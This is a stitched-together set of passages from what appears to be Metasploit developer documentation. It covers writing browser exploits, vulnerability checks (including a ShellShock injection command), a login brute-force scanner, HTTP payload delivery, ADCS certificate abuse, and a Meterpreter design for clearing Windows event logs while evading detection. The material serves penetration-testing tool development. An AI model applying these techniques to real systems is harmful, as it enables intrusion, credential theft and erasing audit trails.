7: . 'BrowserRequirements' =&gt; { :source =&gt; /script|headers/i, 'ua_name' =&gt; HttpClients::IE, }, 'Targets' =&gt; [ [ 'Automatic', {} ], [ 'Windows XP with IE 8', { :os_name =&gt; 'Windows XP', 'ua_ver' =&gt; '8.0', 'Rop' =&gt; true, 'Offset' =&gt; 0x100 } ], [ 'Windows 7 with IE 9', { 'os_name' =&gt; 'Windows 7', 'ua_ver' =&gt; '9.0', 'Rop' =&gt; true, 'Offset' =&gt; 0x200 } ] ] . You can use these for :os_name: . | Constant | Purpose | . | OperatingSystems::Match::WINDOWS | Match all versions of Windows | . | OperatingSystems::Match::WINDOWS_95 | Match Windows 95 | . | OperatingSystems::Match::WINDOWS_98 | Match Windows 98 | . | OperatingSystems::Match::WINDOWS_ME | Match Windows ME | . | OperatingSystems::Match::WINDOWS_NT3 | Match Windows NT 3 | . | OperatingSystems::Match::WINDOWS_NT4 | Match Windows NT 4 | . | OperatingSystems::Match::WINDOWS_2000 | Match Windows 2000 | . | OperatingSystems::Match::WINDOWS_XP | Match Windows XP | . | OperatingSystems::Match::WINDOWS_2003 | Match Windows Server 2003 | . | OperatingSystems::Match::WINDOWS_VISTA | Match Windows Vista | . | OperatingSystems::Match::WINDOWS_2008 | Match Windows Server 2008 | . | OperatingSystems::Match::WINDOWS_7 | Match Windows 7 | . | OperatingSystems::Match::WINDOWS_2012 | Match Windows 2012 | . | OperatingSystems::Match::WINDOWS_8 | Match Windows 8 | . | OperatingSystems::Match::WINDOWS_81 | Match Windows 8.1 | . | OperatingSystems::Match::LINUX | Match a Linux distro | . | OperatingSystems::Match::MAC_OSX | Match Mac OSX | . | OperatingSystems::Match::FREEBSD | Match FreeBSD | . | OperatingSystems::Match::NETBSD | Match NetBSD | . | OperatingSystems::Match::OPENBSD | Match OpenBSD | . | OperatingSystems::Match::VMWARE | Match VMWare | . | OperatingSystems::Match::ANDROID | Match Android | . | OperatingSystems::Match::APPLE_IOS | Match Apple IOS | . You can use these for :ua_name: . | Constant | Value | . | HttpClients::IE | “MSIE” | . | HttpClients::FF | “Firefox” | . | HttpClients::SAFARI | “Safari” | . | HttpClients::OPERA | “Opera” | . | HttpClients::CHROME | “Chrome” | . More of these constants can be found here: https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/constants.rb . All currently supported requirements by the mixin can be found here (see REQUIREMENT_KEY_SET): https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/exploit/remote/browser_exploit_server.rb#L46 . Set up a listener . After the detection stage and the requirement check, the mixin will trigger the “on_request_exploit” callback method, that’s where you handle the HTTP request, craft the HTML, and send back the exploit response. Here’s an example of how to set up “on_request_exploit”: . # # Listens for the HTTP request # cli is the socket # request is the Rex::Proto::Http::Request object # target_info is a hash that contains all the browser info (aka the profile) # def on_request_exploit(cli, request, target_info) print_status(\"Here's what I know about the target: #{target_info.inspect}\") end . Crafting HTML with BrowserExploitServer . There are two coding styles the BrowserExploitServer mixin supports: The good old HTML, or ERB template. The first is pretty self-explanatory: . def on_request_exploit(cli, request, target_info) html = %Q| &lt;html&gt; Hello, world! &lt;/html&gt; | send_exploit_html(cli, html) end . ERB is a new way to write Metasploit browser exploits. If you’ve written one or two web applications, this is no stranger to you. When you’re using the BrowserExploitServer mixin to write an exploit, what really happens is you’re writing a rails template. Here’s an example of using of this feature: . def on_request_exploit(cli, request, target_info) html = %Q| &lt;html&gt; Do you feel lucky, punk?&lt;br&gt; &lt;% if [true, false].sample %&gt; Lucky!&lt;br&gt; &lt;% else %&gt; Bad luck, bro!&lt;Br&gt; &lt;% end %&gt; &lt;/html&gt; | send_exploit_html(cli, html) end . If you want to access local variables or arguments, make sure to pass the binding object to send_exploit_html: . def exploit_template1(target_info, txt) txt2 = \"I can use local vars!\" template = %Q| &lt;% msg = \"This page is generated by an exploit\" %&gt; &lt;%=msg%&gt;&lt;br&gt; &lt;%=txt%&gt;&lt;br&gt; &lt;%=txt2%&gt;&lt;br&gt; &lt;p&gt;&lt;/p&gt; Data gathered from source: #{target_info[:source]}&lt;br&gt; OS name: #{target_info[:os_name]}&lt;br&gt; UA name: #{target_info[:ua_name]}&lt;br&gt; UA version: #{target_info[:ua_ver]}&lt;br&gt; Java version: #{target_info[:java]}&lt;br&gt; Office version: #{target_info[:office]} | return template, binding() end def on_request_exploit(cli, request, target_info) send_exploit_html(cli, exploit_template(target_info, txt)) end . The BrowserExploitServer mixin also offers plenty of other things useful while crafting the exploit. For example: it can generate a target-specific payload when you call the “get_payload” method. It also gives you access to the RopDb mixin, which contains a collection of ROPs to bypass DEP (Data Execution Prevention). Make sure to check out the API documentation for more information. To get thing started, here’s a code example you can use start developing your browser exploit: . ## # This module requires Metasploit: https://metasploit.com/download # Current source: https://github.com/rapid7/metasploit-framework ## class MetasploitModule &lt; Msf::Exploit::Remote Rank = NormalRanking include Msf::Exploit::Remote::BrowserExploitServer def initialize(info = {}) super( update_info( info, 'Name' =&gt; 'BrowserExploitServer Example', 'Description' =&gt; %q{ This is an example of building a browser exploit using the BrowserExploitServer mixin }, 'License' =&gt; MSF_LICENSE, 'Author' =&gt; [ 'sinn3r' ], 'References' =&gt; [ [ 'URL', 'http://metasploit.com' ] ], 'Platform' =&gt; 'win', 'BrowserRequirements' =&gt; { source: /script|headers/i }, 'Targets' =&gt; [ [ 'Automatic', {} ], [ 'Windows XP with IE 8', { 'os_name' =&gt; 'Windows XP', 'ua_name' =&gt; 'MSIE', 'ua_ver' =&gt; '8.0' } ], [ 'Windows 7 with IE 9', { 'os_name' =&gt; 'Windows 7', 'ua_name' =&gt; 'MSIE', 'ua_ver' =&gt; '9.0' } ] ], 'Payload' =&gt; { 'BadChars' =&gt; \"\\x00\" }, 'DisclosureDate' =&gt; '2013-04-01', 'DefaultTarget' =&gt; 0 ) ) end def exploit_template(target_info) template = %( Data source: &lt;%=target_info[:source]%&gt;&lt;br&gt; OS name: &lt;%=target_info[:os_name]%&gt;&lt;br&gt; UA name: &lt;%=target_info[:ua_name]%&gt;&lt;br&gt; UA version: &lt;%=target_info[:ua_ver]%&gt;&lt;br&gt; Java version: &lt;%=target_info[:java]%&gt;&lt;br&gt; Office version: &lt;%=target_info[:office]%&gt; ) return template, binding end def on_request_exploit(cli, _request, target_info) send_exploit_html(cli, exploit_template(target_info)) end end . JavaScript Obfuscation . BrowserExploitServer relies on the JSObfu mixin to support JavaScript obfuscation. When you’re writing JavaScript, you should always write it like this: . js = js_obfuscate(your_code) . The #js_obfuscate will return a Rex::Exploitation::JSObfu object. To get the obfuscated JavaScript, call the #to_s method: . js.to_s . If you need to access an obfuscated symbol name, you can use then #sym method: . # Get the obfuscated version of function name test() var_name = js.sym('test') . Note that by default, even though your module is calling the #js_obfuscate method, obfuscation will not kick in unless the user sets the JsObfuscate datastore option. This option is an OptInt, which allows you to set the number of times to obfuscate (default is 0). If your BES-based exploit does not want obfuscation at all, always make sure you call the #deregister_options and remove the JsObfuscate option. Like this: . deregister_options('JsObfuscate') . To learn more about Metasploit’s JavaScript obfuscation capabilities, please read How to obfuscate JavaScript in Metasploit.

    "content": "The Metasploit Framework provides different mixins you can use to develop a browser exploit, mainly they are Msf::Exploit::Remote::HttpServer, Msf::Exploit::Remote::HttpServer::HTML and Msf::Exploit::Remote::BrowserExploitServer. This writeup covers the HttpServer mixin. The HttpServer mixin is kind of the mother of all HTTP server mixins (like BrowserExploitServer and HttpServer::HTML). To use it, your module is required to have a “on_request_uri” method, which is a callback triggered when the HTTP server receives a HTTP request from the browser. An example of setting up “on_request_uri”: . # # Listens for a HTTP request. # cli is the socket object, and request is a Rex::Proto::Http::Request object # def on_request_uri(cli, request) print_status(\"Client requests URI: #{request.uri}\") end . The “on_request_uri” method is also where you can create the HTTP response. Here’s a couple of choices you can use to do that: . | send_not_found(cli) - Sends a 404 to the client. Make sure to pass the cli (socket) object. | send_redirect(cli, location=’/’, body=’’, headers={}) - Redirects the client to a new location. | send_response(cli, body, headers={}) - Sends a response to the client. This method is probably what you’ll be using most of the time. | . If you’ve seen some of our exploit modules, you will also see them using Exploit::Remote::HttpServer::HTML instead of Exploit::Remote::HttpServer. Usage is mostly the same, the difference is the Exploit::Remote::HttpServer::HTML mixin gives you access to some Javascript functions like Base64, heap spraying, OS detection, etc. Here’s an example of sending a HTTP response: . # # Sends a \"Hello, world!\" to the client # def on_request_uri(cli, request) html = \"Hello, world!\" send_response(cli, html) end . Also note that in order to handle a HTTP request, it must contain the base URIPATH, which by default is random. This means if you want to handle multiple URIs (possible if you need to handle a redirect or a link), you also need to make sure they have the base URIPATH. To retrieve the base URIPATH, you can use the “get_resource” method, here’s an example: . def serve_page_1(cli) html = \"This is page 1\" send_response(cli, html) end def serve_page_2(cli) html = \"This is page 2\" send_response(cli, html) end def serve_default_page(cli) html = %Q| &lt;html&gt; &lt;a href=\"#{get_resource.chomp('/')}/page_1.html\"&gt;Go to page 1&lt;/a&gt;&lt;br&gt; &lt;a href=\"#{get_resource.chomp('/')}/page_2.html\"&gt;Go to page 2&lt;/a&gt; &lt;/html&gt; | send_response(cli, html) end def on_request_uri(cli, request) case request.uri when /page_1\\.html$/ serve_page_1(cli) when /page_2\\.html$/ serve_page_2(cli) else serve_default_page(cli) end end . Of course, when you write a Metasploit browser exploit there’s a lot more you need to think about. For example, your module probably needs to do browser detection, because it wouldn’t make any sense to allow Chrome to receive an IE exploit, would it? You probably also need to build a payload that’s specific to the target, which means your module needs to know what target it’s hitting, and you have to build a method to customize the exploit accordingly, etc. The HttpServer and HttpServer::HTML mixin provides all kinds of methods to allow you to accomplish all these. Make sure to check out the API documentation (you can either do this by running msf/documentation/gendocs.sh, or just run “yard” in the msf directory), or checkout existing code examples (especially the recent ones). To get things started, you can always use the following template to start developing your browser exploit: . ## # This module requires Metasploit: https://metasploit.com/download # Current source: https://github.com/rapid7/metasploit-framework ## class MetasploitModule &lt; Msf::Exploit::Remote Rank = NormalRanking include Msf::Exploit::Remote::HttpServer def initialize(info = {}) super( update_info( info, 'Name' =&gt; 'HttpServer mixin example', 'Description' =&gt; %q{ Here's an example of using the HttpServer mixin }, 'License' =&gt; MSF_LICENSE, 'Author' =&gt; [ 'sinn3r' ], 'References' =&gt; [ [ 'URL', 'http://metasploit.com' ] ], 'Platform' =&gt; 'win', 'Targets' =&gt; [ [ 'Generic', {} ], ], 'DisclosureDate' =&gt; '2013-04-01', 'DefaultTarget' =&gt; 0 ) ) end def on_request_uri(cli, _request) html = 'hello' send_response(cli, html) end end .

For example: version, banner grabbing, or simply having the resource that’s known to be vulnerable. | . | Exploit::CheckCode::Vulnerable | Only used if the check is able to actually take advantage of the bug, and obtain some sort of hard evidence. For example: for a command execution type bug, get a command output from the target system. For a directory traversal, read a file from the target, etc. Since this level of check is pretty aggressive in nature, you should not try to DoS the host as a way to prove the vulnerability. | . | Exploit::CheckCode::Unsupported | The exploit does not support the check method.

    "content": "Here’s an abstract example of how a Metasploit check might be written: . # # Returns a check code that indicates the vulnerable state on an app running on OS X # def check if exec_cmd_via_http(\"id\") =~ /uid=\\d+\\(.+\\)/ # Found the correct ID output, good indicating our command executed return Exploit::CheckCode::Vulnerable end http_body = get_http_body if http_body if http_body =~ /Something CMS v1\\.0/ # We are able to find the version therefore more precise about the vuln state return Exploit::CheckCode::Appears elsif http_body =~ /Something CMS/ # All we can tell the vulnerable app is running, but no more info to # determine the vuln return Exploit::CheckCode::Detected end else vprint_error(\"Unable to determine due to a HTTP connection timeout\") return Exploit::CheckCode::Unknown end Exploit::CheckCode::Safe end . Note: If you are writing an auxiliary module with the Msf::Auxiliary::Scanner mixin, you should declare your check method like this: . def check_host(ip) # Do your thing end . Local Exploit Check Example . Most local exploit checks are done by checking the version of the vulnerable file, which is considered passive, therefore they should be flagging Exploit::CheckCode::Appears. Passive local exploit checks don’t necessarily mean they are less reliable, in fact, they are not bad. But to qualify for Exploit::CheckCode::Vulnerable, your check should do the extra mile, which means either you somehow make the program return a vulnerable response, or you inspect the vulnerable code. An example of making the program return a vulnerable response is ShellShock (the following is specific for VMWare): . def check check_str = Rex::Text.rand_text_alphanumeric(5) # ensure they are vulnerable to bash env variable bug if cmd_exec(\"env x='() { :;}; echo #{check_str}' bash -c echo\").include?(check_str) &amp;&amp; cmd_exec(\"file '#{datastore['VMWARE_PATH']}'\") !~ /cannot open/ Exploit::CheckCode::Vulnerable else Exploit::CheckCode::Safe end end . One way to inspect the vulnerable code is to come up with a signature, and see if it exists in the vulnerable process. Here’s an example with adobe_sandbox_adobecollabsync.rb: . # 'AdobeCollabSyncTriggerSignature' =&gt; \"\\x56\\x68\\xBC\\x00\\x00\\x00\\xE8\\xF5\\xFD\\xFF\\xFF\" # 'AdobeCollabSyncTrigger' =&gt; 0x18fa0 def check_trigger signature = session.railgun.memread(@addresses['AcroRd32.exe'] + target['AdobeCollabSyncTrigger'], target['AdobeCollabSyncTriggerSignature'].length) if signature == target['AdobeCollabSyncTriggerSignature'] return true end return false end def check @addresses = {} acrord32 = session.railgun.kernel32.GetModuleHandleA(\"AcroRd32.exe\") @addresses['AcroRd32.exe'] = acrord32[\"return\"] if @addresses['AcroRd32.exe'] == 0 return Msf::Exploit::CheckCode::Unknown elsif check_trigger return Msf::Exploit::CheckCode::Vulnerable else return Msf::Exploit::CheckCode::Detected end end . Another possible way to inspect is grab the vulnerable file, and use Metasm. But of course, this is a lot slower and generates more network traffic. ",

If you’re already familiar with writing a Metasploit module that sends an HTTP request, the first thing that comes to mind is probably using the HttpClient. Well, you can’t do that at all over here, so we have to fall back to Rex::Proto::Http::Client. Fortunately for you, we made all this a little bit easier by creating another request called #send_request, here’s an example of how to use that: . send_request({'uri'=&gt;'/'}) . You will rely on this method a lot to accomplish most of what you need to do here. Ok, now, let’s move on and talk about how to use #send_request to send a login request. Remember in the login request, there is actually a PHPSESSID cookie, you should obtain this first. Usually the web application will give you the session cookie when you request the login page for the very first time, and this happens a lot. Here’s an example of how to grab PHPSESSID: . def get_session_id login_uri = normalize_uri(\"#{uri}/spywall/login.php\") res = send_request({'uri' =&gt; login_uri}) sid = res.get_cookies.scan(/(PHPSESSID=\\w+);*/).flatten[0] || '' return sid end . Now that you have a session ID, you can finally make the login request. Remember in the sample, we have to submit the username, password, loginBtn as a POST request. So let’s do that with #send_request: . protocol = ssl ? 'https' : 'http' peer = \"#{host}:#{port}\" login_uri = normalize_uri(\"#{uri}/spywall/login.php\") res = send_request({ 'uri' =&gt; login_uri, 'method' =&gt; 'POST', 'cookie' =&gt; get_session_id, 'headers' =&gt; { 'Referer' =&gt; \"#{protocol}://#{peer}/#{login_uri}\" }, 'vars_post' =&gt; { 'USERNAME' =&gt; username, 'PASSWORD' =&gt; password, 'loginBtn' =&gt; 'Login' # Found in the HTML form } }) . Now that the request is sent, we need to check the response (the res variable). Typically, you have a few choices to determine a successful login: . | Check the HTTP response code. In this case, we have a 302 (redirect), but know that sometimes the response code can lie so this should not be your first choice. | Check the HTML. With some web applications, you might get a “successful login” message, and you can regex that. This is most likely the most accurate way. | Check the location header. In our case, Symantec returns a 302 and contains no body. But it redirects us to a spywall/executive_summary.php page in the location header, so we can use that. We can also try to access executive_summary.php with a renewed session ID, and make sure we can actually see the admin interface, but requesting an extra page adds more penalty to performance, so this is up to you. | . In the end, your custom login method will probably look something like this: . def do_login(username, password) protocol = ssl ? 'https' : 'http' peer = \"#{host}:#{port}\" login_uri = normalize_uri(\"#{uri}/spywall/login.php\") res = send_request({ 'uri' =&gt; login_uri, 'method' =&gt; 'POST', 'cookie' =&gt; get_session_id, 'headers' =&gt; { 'Referer' =&gt; \"#{protocol}://#{peer}/#{login_uri}\" }, 'vars_post' =&gt; { 'USERNAME' =&gt; username, 'PASSWORD' =&gt; password, 'loginBtn' =&gt; 'Login' # Found in the HTML form } }) if res &amp;&amp; res.headers['Location'].include?('executive_summary.php') return {:status =&gt; LOGIN_STATUS::SUCCESSFUL, :proof =&gt; res.to_s} end {:proof =&gt; res.to_s} end . The exact statuses you can return are: . | Constant | Purpose | . | Metasploit::Model::Login::Status::DENIED_ACCESS | Access is denied | . | Metasploit::Model::Login::Status::DISABLED | Account is disabled | . | Metasploit::Model::Login::Status::INCORRECT | Credential is incorrect | . | Metasploit::Model::Login::Status::LOCKED_OUT | Account has been locked out | . | Metasploit::Model::Login::Status::NO_AUTH_REQUIRED | No authentication | . | Metasploit::Model::Login::Status::SUCCESSFUL | Successful login | . | Metasploit::Model::Login::Status::UNABLE_TO_CONNECT | Unable to connect to the service | . | Metasploit::Model::Login::Status::UNTRIED | Credential has not been tried | . | Metasploit::Model::Login::Status::ALL | All the above (An array) | .

    "title": "Step 4: Write the auxiliary module",
    "content": "The auxiliary module acts more like an user-interface. You describe what the module does, handles options, initializes objects, and do reporting. A basic auxiliary module template in our case would be something like this: . ## # This module requires Metasploit: https://metasploit.com/download # Current source: https://github.com/rapid7/metasploit-framework ## require 'metasploit/framework/login_scanner/symantec_web_gateway' require 'metasploit/framework/credential_collection' class MetasploitModule &lt; Msf::Auxiliary include Msf::Exploit::Remote::HttpClient include Msf::Auxiliary::AuthBrute include Msf::Auxiliary::Report include Msf::Auxiliary::Scanner def initialize(info = {}) super( update_info( info, 'Name' =&gt; 'Symantec Web Gateway Login Utility', 'Description' =&gt; %q{ This module will attempt to authenticate to a Symantec Web Gateway. }, 'Author' =&gt; [ 'sinn3r' ], 'License' =&gt; MSF_LICENSE, 'DefaultOptions' =&gt; { 'RPORT' =&gt; 443, 'SSL' =&gt; true, 'SSLVersion' =&gt; 'TLS1' } ) ) end def run_host(ip) end end . Save it under modules/auxiliary/scanner/http/. Our main method is #run_host, so we’ll begin there. But before we do, we must initialize your LoginScanner object. The following is an example of how you will probably write it. def scanner(ip) @scanner ||= lambda { cred_collection = Metasploit::Framework::CredentialCollection.new( blank_passwords: datastore['BLANK_PASSWORDS'], pass_file: datastore['PASS_FILE'], password: datastore['PASSWORD'], user_file: datastore['USER_FILE'], userpass_file: datastore['USERPASS_FILE'], username: datastore['USERNAME'], user_as_pass: datastore['USER_AS_PASS'] ) return Metasploit::Framework::LoginScanner::SymantecWebGateway.new( configure_http_login_scanner( host: ip, port: datastore['RPORT'], cred_details: cred_collection, stop_on_success: datastore['STOP_ON_SUCCESS'], bruteforce_speed: datastore['BRUTEFORCE_SPEED'], connection_timeout: 5 )) }.call end . Notice that this scanner method can be called multiple times, but the use of lambda will allow the LoginScanner object to initialize only once. After that first time, every time the method is called, it will just return @scanner instead of going through the whole initialization process again. In some cases you might need to pass more datastore options, maybe not. For example, if you want to allow the URI to be configurable (which is also already an accessor in Metasploit::Framework::LoginScanner::HTTP), then you have to create and pass datastore[‘URI’] to configure_http_login_scanner too, like so: . uri: datastore['URI'] . And then in your LoginScanner, pass uri to #send_request: . send_request({'uri'=&gt;uri}) . At this point, the scanner method holds our Metasploit::Framework::LoginScanner::SymantecWebGateway object. If we call the #scan! method, it will trigger the #attempt_login method we wrote earlier, and then yield the Result object. Basically like this: . scanner(ip).scan! do |result| # result = Our Result object end . With the Result object, we can start reporting. In most cases, you will probably be using #create_credential_login to report a successful login. And use #invalidate_login to report a bad one. Reporting a valid credential . The credential API knows a lot about a credential, such as when it was used, how it was used, serviced tried, target IP, port, etc, etc. So when we report, that’s how much information we are storing for every credential. To make credential reporting easy to use, all you need to do is call the #store_valid_credential method like this: . store_valid_credential( user: result.credential.public, private: result.credential.private, private_type: :password, # This is optional proof: nil, # This is optional ) . Report an invalid credential . Here’s another example you can use: . # Reports a bad credential. # # @param [String] ip Target host # @param [Fixnum] port Target port # @param [Result] The Result object # @return [void] def report_bad_cred(ip, rport, result) invalidate_login( address: ip, port: rport, protocol: 'tcp', public: result.credential.public, private: result.credential.private, realm_key: result.credential.realm_key, realm_value: result.credential.realm, status: result.status, proof: result.proof ) end . At this point, you’re pretty much done with the auxiliary module. It will probably look something like this: https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/scanner/http/symantec_web_gateway_login.rb . ",

    "doc": "How to write a module using HttpServer and HttpClient",
    "title": "How to write a module using HttpServer and HttpClient",
    "content": "Using multiple networking mixins in a Metasploit module is always a tricky thing to do, because most likely you will run into issues like overlapping datastore options, variables, methods, the super call is only meant for one mixin, etc. This is considered as advanced module development, and sometimes can be rather painful to figure out on your own. To improve the Metasploit development experience, we have a few examples to demonstrate common scenarios that require you to use multiple mixins to achieve exploitation. Today’s lesson: Send a HTTP request to attack the target machine, and use a HttpServer for payload delivery. Say you want to exploit a web server or web application. You have code execution on the box, but you need to find a way to deliver the final payload (probably an executable), and a HTTP server happens to be your option. Here is how you can set it up: . ## # This module requires Metasploit: https://metasploit.com/download # Current source: https://github.com/rapid7/metasploit-framework ## class MetasploitModule &lt; Msf::Exploit::Remote Rank = NormalRanking include Msf::Exploit::Remote::HttpClient include Msf::Exploit::Remote::HttpServer::HTML def initialize(info = {}) super( update_info( info, 'Name' =&gt; 'HttpClient and HttpServer Example', 'Description' =&gt; %q{ This demonstrates how to use two mixins (HttpClient and HttpServer) at the same time, but this allows the HttpServer to terminate after a delay. }, 'License' =&gt; MSF_LICENSE, 'Author' =&gt; [ 'sinn3r' ], 'References' =&gt; [ ['URL', 'http://metasploit.com'] ], 'Payload' =&gt; { 'BadChars' =&gt; \"\\x00\" }, 'Platform' =&gt; 'win', 'Targets' =&gt; [ [ 'Automatic', {} ], ], 'Privileged' =&gt; false, 'DisclosureDate' =&gt; '2013-12-09', 'DefaultTarget' =&gt; 0 ) ) register_options( [ OptString.new('TARGETURI', [true, 'The path to some web application', '/']), OptInt.new('HTTPDELAY', [false, 'Number of seconds the web server will wait before termination', 10]) ], self.class ) end def on_request_uri(cli, req) print_status(\"#{peer} - Payload request received: #{req.uri}\") send_response(cli, 'You get this, I own you') end def primer print_status(\"Sending a malicious request to #{target_uri.path}\") send_request_cgi({ 'uri' =&gt; normalize_uri(target_uri.path) }) end def exploit Timeout.timeout(datastore['HTTPDELAY']) { super } rescue Timeout::Error # When the server stops due to our timeout, this is raised end end . Here’s what happens when you run the above example: . | The super call wrapped in the Timeout block will start the web server. | Before the web server is in the infinite loop state, the primer() method is called, which is where you send your malicious requests to get code execution. | Your HttpServer serves the final payload upon request. | After 10 seconds, the module raises a Timeout exception. The web server finally terminates. | . In case you’re wondering why the web server must terminate after a period of time, this is because if the module fails to gain code execution on the target machine, obviously it will never ask your web server for the malicious payload, therefore there is no point to keeping it alive forever. Typically it shouldn’t take a very long time to get a payload request, either, so we keep the timeout short. The output for the above example should look something like this: . msf exploit(test) &gt; run [*] Exploit running as background job. [*] Started reverse handler on 10.0.1.76:4444 [*] Using URL: http://0.0.0.0:8080/SUuv1qjZbCibL80 [*] Local IP: http://10.0.1.76:8080/SUuv1qjZbCibL80 [*] Server started.

Exploiting this misconfiguration to specify a different UPN effectively issues a certificate that can be used to authenticate as another user. If the target server has the KB5014754 patch applied and the REG_DWORD HKLM\\SYSTEM\\CurrentControlSet\\Services\\Kdc\\StrongCertificateBindingEnforcement value is set to 2, then the SID for the account with the specified UPN should be supplied as well. In November of 2023, Microsoft will change the default value of StrongCertificateBindingEnforcement to 2. If the server has the patch applied, the SID will be returned in the issued certificate which ensures that the required strong mapping is in place. If the strong mapping is required and the SID is not specified in the certificate, then Kerberos authentication will fail with KDC_ERR_CERTIFICATE_MISMATCH. The user must know: . | A vulnerable certificate template, in this case ESC1-Test. | The SID of a target account, in this case S-1-5-21-3402587289-1488798532-3618296993-1000 | The UPN of a target account, in this case smcintyre@msflab.local. | .

    "content": "So I see your browser exploit has refused to attack due to some kind of unmet requirements. Typically this means one of the following: . | Your target doesn’t have the right conditions to be exploited. | Your target isn’t vulnerable at all. | . The exploit should say what requirements are not met. The requirements are explained here: . | Key | Description | . | :source | Target has JavaScript disabled. | . | :ua_name | Target isn’t using the preferred browser. For example: Firefox, IE. | . | :ua_ver | Target isn’t using the preferred browser version. | . | :os_name | Target isn’t using the preferred operating system. | . | :os_flavor | This has been deprecated. If you see this, your Metasploit is most likely out of date. | . | :language | Target isn’t using the preferred OS language. | . | :arch | Target isn’t on the preferred architecture. For example: x86/x64 | . | :proxy | Target has a proxy. | . | :silverlight | Target doesn’t have Silverlight installed. | . | :office | Target doesn’t have the preferred version of Microsoft Office installed, so the exploit cannot bypass DEP. | . | :java | Target doesn’t have the preferred version of Java. Often this is used by exploits to bypass DEP. | . | :clsid | Target doesn’t have the preferred ActiveX control. If this is the problem, you will only see a mismatch with :activex instead of :clsid. | . | :method | Target doesn’t have the preferred ActiveX control. If this is the problem, you will only see a mismatch with :activex instead of :method. | . | :mshtml_build | Target isn’t on the preferred build of Internet Explorer. Usually means only specific builds of IE are vulnerable. | . | :flash | Target isn’t using the preferred version of Adobe Flash. Often this is used by exploits to leverage code execution. | . | :vuln_test | A custom JavaScript-based check. There should be a custom vuln_test_error message explaining why on msfconsole. | .

For instance the Java Meterpreter only implements 25% of stdapi on windows, in comparison to the Python Meterpreter’s 50% coverage, or the Window’s Meterpreter at 94% coverage. Java does have out of the box support for many of the library calls that we would require for improving Meterpreter compatibility, i.e. to manipulate the Windows event log, support Railgun etc. To implement feature parity the following pull request were spiked: . | Add clearev command on Windows using JNA - Adding Meterpreter’s event log manipulation commands. Uses an off-the-shelf library for making native system calls via JNA. This approach would allow for implementation of the remaining calls that aren’t supported by Java out of the box. | Add Railgun support to Java Meterpreter against Windows - Using a custom library for Railgun support | .

Native call support will be provided by JNA - an open source library which provides easy access to Window’s APIs. Using JNA would help reduce the boilerplate for making Windows API calls, is maintained by an existing community, and is less likely to be detected as malicious. The sequence of steps required for loading stdapi and invoking clear event log: . sequenceDiagram msfconsole-&gt;&gt;+meterpreter: load core library meterpreter--&gt;&gt;-msfconsole: return success and list of available commands msfconsole-&gt;&gt;+meterpreter: get architecture from core library meterpreter--&gt;&gt;-msfconsole: e.g. Windows 10 x64 msfconsole-&gt;&gt;+meterpreter: load stdapi - i.e. classfiles + JNA + Railgun dll meterpreter-&gt;&gt;meterpreter: Load new java commands note right of meterpreter: Keep JNA + Railgun library in memory&lt;br /&gt;Don't load them yet meterpreter--&gt;&gt;-msfconsole: return success and list of available commands msfconsole-&gt;&gt;+meterpreter: clear event log rect rgb(191, 223, 255, .3) note right of meterpreter: Load JNA if it's &lt;br &gt;not been loaded before meterpreter-&gt;&gt;meterpreter: Copy JNA from classpath to file system meterpreter-&gt;&gt;meterpreter: System.load(temp path) meterpreter-&gt;&gt;meterpreter: delete temp path end meterpreter-&gt;&gt;meterpreter: clear event log using JNA meterpreter--&gt;&gt;-msfconsole: clear event log result . Railgun support . Railgun requires access to low-level functionality, i.e. directly manipulating memory etc. Java does not support this functionality directly unless a Java wrapper is provided. Therefore a JNI wrapper for the current Railgun implementation will be developed - similar to the previous prototype. Maven would be updated to build this library for different architectures/platforms. Similar to the implementation of native system calls; We will move the OS detection from stdapi to core. This would allow us to detect the victim’s OS and architecture as part of the core API, allowing stdapi to additionally include the correct Railgun and JNA dll/so/dylib library files. Once a native call needs to be executed, Meterpreter would attempt to load JNA and use it to the native Windows API to begin the process of reflectively loading the compiled Railgun library. The sequence of steps required for loading stdapi and invoking Railgun: . sequenceDiagram msfconsole-&gt;&gt;+meterpreter: load core library meterpreter--&gt;&gt;-msfconsole: return success and list of available commands msfconsole-&gt;&gt;+meterpreter: get architecture from core library meterpreter--&gt;&gt;-msfconsole: e.g. Windows 10 x64 msfconsole-&gt;&gt;+meterpreter: load stdapi - i.e. classfiles + JNA + Railgun dll meterpreter-&gt;&gt;meterpreter: Load new java commands note right of meterpreter: Keep JNA + Railgun library in memory&lt;br /&gt;Don't load them yet meterpreter--&gt;&gt;-msfconsole: return success and list of available commands msfconsole-&gt;&gt;+meterpreter: Railgun call rect rgb(191, 223, 255, .3) note right of meterpreter: Load JNA if it's &lt;br &gt;not been loaded before meterpreter-&gt;&gt;meterpreter: Copy JNA from classpath to file system meterpreter-&gt;&gt;meterpreter: System.load(tempPath) meterpreter-&gt;&gt;meterpreter: tempPath.deleteOnExit() end rect rgb(191, 223, 255, .3) note right of meterpreter: Load Railgun if it's &lt;br &gt;not been loaded before meterpreter-&gt;&gt;meterpreter: Use JNA to reflectively load Railgun end meterpreter-&gt;&gt;meterpreter: invoke Railgun call meterpreter--&gt;&gt;-msfconsole: Railgun result . For an initial release the Railgun and JNA libraries would be sent as part of stdapi. This would increase the size to about 200KB on top of the 70KB Meterpreter Jar (228KB uncompressed). We will also keep Railgun in stdapi (where it currently lives). Alternative Implementation 1 . An alternative solution to updating stdapi to additionally include Railgun/JNA - is to keep stdapi as it exists today, and to attempt loading a ‘bigger’ stdapi with the additional Railgun functionality when a post module requires Railgun. This would work as follows: . sequenceDiagram msfconsole-&gt;&gt;+meterpreter: load core library meterpreter--&gt;&gt;-msfconsole: return success and list of available commands msfconsole-&gt;&gt;+meterpreter: get architecture from core library meterpreter--&gt;&gt;-msfconsole: e.g. Windows 10 x64 msfconsole-&gt;&gt;+meterpreter: load stdapi as normal, without JNA/Railgun meterpreter-&gt;&gt;meterpreter: Load new java commands meterpreter--&gt;&gt;-msfconsole: return success and list of available commands user-&gt;&gt;+msfconsole:run post module: msfconsole-&gt;&gt;msfconsole: Load module, verify requirements opt If module requires Railgun, and session hasn't been sent Railgun/JNA before rect rgb(191, 223, 255, .3) msfconsole-&gt;&gt;+meterpreter: load 'bigger' stdapi - i.e. classfiles + JNA + Railgun dll meterpreter-&gt;&gt;meterpreter: Load new java commands note right of meterpreter: Keep JNA + Railgun library in memory&lt;br /&gt;Don't load them yet meterpreter--&gt;&gt;-msfconsole: return success and list of available commands end end msfconsole-&gt;&gt;+meterpreter: Railgun call rect rgb(191, 223, 255, .3) note right of meterpreter: Load JNA if it's &lt;br &gt;not been loaded before 